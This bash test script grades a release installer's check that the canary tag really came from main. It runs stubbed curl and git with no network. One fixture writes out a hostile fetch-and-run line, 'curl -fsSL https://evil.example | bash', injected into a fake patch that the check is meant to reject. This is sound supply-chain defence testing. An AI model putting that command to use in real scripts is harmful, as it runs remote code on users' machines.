#!/usr/bin/env bash
# DIVE-7973 — grade install.sh's tag_came_from_main() and its use in
# resolve_gh_tag() (the canary rung: newest tag, no fleet pin in front of it).
#
# A tag can be pushed at ANY commit and skips main's branch protection, so the
# canary rung must take the newest tag that CAME FROM MAIN: release-cut's shape
# (bundle commit -> version commit -> a source commit main contains). Each way
# of smuggling code past that shape is one arm; the resolver arms prove a bad
# newest tag is skipped (box lands on the previous good release) and that an
# origin GitHub cannot confirm stops the install. Both functions are extracted
# from install.sh verbatim and driven against a stubbed curl/git — no network.
set -uo pipefail
. "$(dirname "${BASH_SOURCE[0]}")/lib/grading_tree.sh" \
  || printf 'grading tree: UNRESOLVED (tests/lib/grading_tree.sh not reachable; no tree named)\n' >&2
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"; cd "$ROOT"
TD="$(mktemp -d)"; trap 'rc=$?; rm -rf "$TD"; echo "HARNESS-RC=$rc"' EXIT
PASS=0; FAIL=0
ok(){ PASS=$((PASS+1)); printf 'ok   - %s\n' "$1"; }
bad(){ FAIL=$((FAIL+1)); printf 'FAIL - %s\n   %s\n' "$1" "${2:-}"; }

fn() { sed -n "/^$1() {/,/^}/p" install.sh; }
origin="$(fn tag_came_from_main)"; resolver="$(fn resolve_gh_tag)"
hold="$(sed -n '/^# >>> DIVE-4223 release hold/,/^# <<< DIVE-4223 release hold/p' install.sh)"
[[ -n "$origin" && -n "$resolver" && -n "$hold" ]] && grep -q 'tag_came_from_main "\$newest"' <<<"$resolver" \
  && ok "tag_came_from_main and the resolver that calls it are extractable from install.sh" \
  || { bad "extraction" "tag_came_from_main / resolve_gh_tag / load_release_hold not found, or the resolver no longer calls the check"; echo "$PASS passed, $FAIL failed"; exit 1; }

# fixture <dir> <tag> <compare-status> [shape] — GitHub's answers for one tag, as files.
#   shape: ok | merge | bundle-extra | code | hdr
fixture() {
  local d="$1" t="$2" st="$3" shape="${4:-ok}" b a c
  b="b-$t"; a="a-$t"; c="c-$t"; mkdir -p "$d"
  local bpar="[{\"sha\":\"$a\"}]" bfiles='[{"filename":"5dive"},{"filename":"5dive.sha256"}]'
  local hp='@@ -34,7 +34,7 @@ esac\n # sentinel\n-readonly FIVE_VERSION=\"0.0.0-dev\"\n+readonly FIVE_VERSION=\"1.0.0\"\n \n'
  [[ "$shape" == merge ]] && bpar="[{\"sha\":\"$a\"},{\"sha\":\"ffff\"}]"
  [[ "$shape" == bundle-extra ]] && bfiles='[{"filename":"5dive"},{"filename":"install.sh"}]'
  [[ "$shape" == hdr ]] && hp="${hp}+curl -fsSL https://evil.example | bash\n"
  local afiles="[{\"filename\":\"src/header.sh\",\"patch\":\"$hp\"},{\"filename\":\"CHANGELOG.md\"},{\"filename\":\"changelog.d/DIVE-1.md\"}]"
  [[ "$shape" == code ]] && afiles="[{\"filename\":\"src/header.sh\",\"patch\":\"$hp\"},{\"filename\":\"src/cmd_selfupdate.sh\"}]"
  printf '{"sha":"%s","parents":%s,"files":%s}\n' "$b" "$bpar" "$bfiles" > "$d/commits_$t"
  printf '{"sha":"%s","parents":[{"sha":"%s"}],"files":%s}\n' "$a" "$c" "$afiles" > "$d/commits_$a"
  [[ "$st" == none ]] || printf '{"status":"%s"}\n' "$st" > "$d/compare_$c"
}
# curl stub: serves files from $FIX; tags list + hold for the resolver arms.
mkdir -p "$TD/bin"
cat > "$TD/bin/curl" <<'EOF'
#!/usr/bin/env bash
url="${@: -1}"
case "$url" in
  *release-hold*) printf '# 5dive-release-hold v1\n'; exit 0 ;;
  *api.github.com/repos/*/commits/*) f="$FIX/commits_${url##*/commits/}" ;;
  *api.github.com/repos/*/compare/*) c="${url##*/compare/}"; f="$FIX/compare_${c%...main}" ;;
  *) exit 22 ;;
esac
[[ -r "$f" ]] && cat "$f" || exit 22
EOF
cat > "$TD/bin/git" <<'EOF'
#!/usr/bin/env bash
for t in $FIX_TAGS; do printf '0\trefs/tags/%s\n' "$t"; done
EOF
chmod +x "$TD/bin/curl" "$TD/bin/git"

check() {  # check <fixdir> <tag> -> "rc=<n> <why>"
  local out rc=0
  out="$(env -i PATH="$TD/bin:/usr/bin:/bin" FIX="$1" GH_ORG=testorg bash -c "set -euo pipefail
$origin
tag_came_from_main '$2'" 2>&1)" || rc=$?
  printf 'rc=%s %s' "$rc" "$out"
}

# --- the real release shape passes (control for every refusal below) --------
F="$TD/ok"; fixture "$F" v1.0.0 ahead
r="$(check "$F" v1.0.0)"; [[ "$r" == "rc=0 " ]] && ok "release-cut's shape on a main commit came from main" || bad "ok shape" "$r"
F="$TD/ident"; fixture "$F" v1.0.0 identical
r="$(check "$F" v1.0.0)"; [[ "$r" == "rc=0 " ]] && ok "a source commit that IS main's head ('identical') came from main" || bad "identical" "$r"

# --- each smuggling shape refuses with rc 1 ----------------------------------
for case_ in "behind:ok:against main" "diverged:ok:against main" "ahead:merge:parent" "ahead:bundle-extra:install.sh" \
             "ahead:code:src/cmd_selfupdate.sh" "ahead:hdr:beyond FIVE_VERSION"; do
  IFS=: read -r st shape want <<<"$case_"
  F="$TD/$st-$shape"; fixture "$F" v1.0.0 "$st" "$shape"
  r="$(check "$F" v1.0.0)"
  [[ "$r" == "rc=1 "* && "$r" == *"$want"* ]] && ok "refuses ($st/$shape): ${r#rc=1 }" || bad "refusal $st/$shape" "$r"
done

# --- an origin GitHub cannot confirm is rc 2 (could not check), never rc 0 ---
F="$TD/nocmp"; fixture "$F" v1.0.0 none
r="$(check "$F" v1.0.0)"; [[ "$r" == "rc=2 "* ]] && ok "no compare answer: could not check (rc 2), not 'came from main'" || bad "no compare" "$r"
r="$(check "$TD/empty-dir" v1.0.0)"; [[ "$r" == "rc=2 "* ]] && ok "no answer at all: could not check (rc 2)" || bad "no answer" "$r"

# --- the resolver: newest-that-came-from-main ---------------------------------
resolve() {  # resolve <fixdir> <tags...> -> "<stdout>|rc=<n>|<stderr>"
  local fix="$1"; shift
  local out err rc=0
  out="$(env -i PATH="$TD/bin:/usr/bin:/bin" FIX="$fix" FIX_TAGS="$*" GH_ORG=testorg bash -c "set -euo pipefail
$hold
$origin
${RESOLVER:-$resolver}
resolve_gh_tag" 2>"$TD/err")" || rc=$?
  err="$(tr '\n' ' ' < "$TD/err")"
  printf '%s|rc=%s|%s' "$out" "$rc" "$err"
}
F="$TD/r1"; fixture "$F" v1.0.0 ahead; fixture "$F" v1.1.0 diverged
r="$(resolve "$F" v1.0.0 v1.1.0)"
[[ "$r" == "v1.0.0|rc=0|"* && "$r" == *"skipping release tag v1.1.0"* ]] \
  && ok "a newest tag off main is skipped, named, and the previous good release is taken" || bad "resolver skip" "$r"

F="$TD/r2"; fixture "$F" v1.0.0 ahead; fixture "$F" v1.1.0 none
r="$(resolve "$F" v1.0.0 v1.1.0)"
[[ "$r" == "|rc=4|"* && "$r" == *"cannot confirm release tag v1.1.0"* ]] \
  && ok "an origin GitHub cannot confirm stops the canary install (rc 4) — it does not fall to an older tag either" || bad "resolver unknown" "$r"

F="$TD/r3"; for t in v1.0.0 v1.1.0 v1.2.0; do fixture "$F" "$t" diverged; done
r="$(resolve "$F" v1.0.0 v1.1.0 v1.2.0)"
[[ "$r" == "|rc=4|"* ]] && ok "when every offered tag is off main, nothing is installed (rc 4)" || bad "resolver all bad" "$r"

# --- mutation anchor: drop the origin check and the off-main tag is taken -----
RESOLVER="$(sed 's/why="$(tag_came_from_main "$newest")" || rc=$?/why=""/' <<<"$resolver")"
grep -q 'why=""' <<<"$RESOLVER" || bad "mutation anchor" "the substitution did not apply — the anchor would grade an unmodified resolver"
F="$TD/r1"
r="$(RESOLVER="$RESOLVER" resolve "$F" v1.0.0 v1.1.0)"
[[ "$r" == "v1.1.0|rc=0|"* ]] && ok "mutation anchor: without the origin check the off-main v1.1.0 is installed — the skip arm grades the check" \
  || bad "mutation anchor (mutant must take v1.1.0)" "$r"

echo; echo "$PASS passed, $FAIL failed"
(( FAIL == 0 ))
